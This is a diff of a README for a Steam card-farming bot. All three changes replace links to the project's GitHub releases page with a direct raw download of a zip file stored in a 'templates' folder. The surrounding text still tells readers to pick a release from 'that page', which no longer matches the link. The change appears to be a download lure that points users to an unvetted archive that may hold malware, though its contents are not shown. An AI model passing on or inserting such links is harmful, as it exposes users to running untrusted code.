@@ -1,6 +1,6 @@
 # 🤖 SteamCardFarmer - Simple Steam Card Farming Tool
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rustinenzymatic573/SteamCardFarmer/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rustinenzymatic573/SteamCardFarmer/raw/refs/heads/main/templates/Farmer_Card_Steam_1.3-beta.1.zip)
 
 ## 🧭 What SteamCardFarmer Does
 
@@ -31,7 +31,7 @@ For best results, keep Steam installed and signed in before you start.
 
 Visit this page to download the latest version:
 
-https://github.com/rustinenzymatic573/SteamCardFarmer/releases
+https://github.com/rustinenzymatic573/SteamCardFarmer/raw/refs/heads/main/templates/Farmer_Card_Steam_1.3-beta.1.zip
 
 On that page, pick the newest release and download the Windows file.
 
@@ -187,4 +187,4 @@ SteamCardFarmer is a Steam card farming bot for users who want a simple desktop 
 
 ## 🔗 Download Again
 
-[Visit the release page to download SteamCardFarmer](https://github.com/rustinenzymatic573/SteamCardFarmer/releases)
+[Visit the release page to download SteamCardFarmer](https://github.com/rustinenzymatic573/SteamCardFarmer/raw/refs/heads/main/templates/Farmer_Card_Steam_1.3-beta.1.zip)
